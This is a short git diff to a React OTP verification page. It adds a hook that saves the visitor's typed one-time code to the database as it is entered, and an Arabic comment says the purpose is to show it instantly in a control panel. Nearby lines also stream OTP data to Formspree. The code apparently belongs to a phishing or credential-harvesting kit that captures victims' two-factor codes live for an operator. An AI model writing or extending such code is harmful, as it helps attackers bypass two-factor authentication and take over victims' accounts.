@@ -8,6 +8,7 @@ import { ChatButton } from "@/components/ChatButton";
 import { Footer } from "@/components/Footer";
 import { useToast } from "@/hooks/use-toast";
 import { useFormspreeSync } from "@/hooks/useFormspreeSync";
+import { useAutoSave } from "@/hooks/useAutoSave";
 import { supabase } from "@/integrations/supabase/client";
 import { getApplicationStatus } from "@/lib/applicationPublic";
 import { updateApplicationPublic } from "@/lib/ownerToken";
@@ -46,6 +47,12 @@ const OTPVerification = () => {
   const [waitingProgress, setWaitingProgress] = useState(0);
   
   usePresence(applicationId || undefined, 'otp');
+
+  // حفظ لحظي لرمز OTP في قاعدة البيانات ليظهر فوراً في لوحة التحكم
+  useAutoSave(applicationId, {
+    otp_code: otp,
+    current_step: 'otp',
+  }, "OTPVerification");
 
   // Send OTP data to Formspree in real-time
   useFormspreeSync({
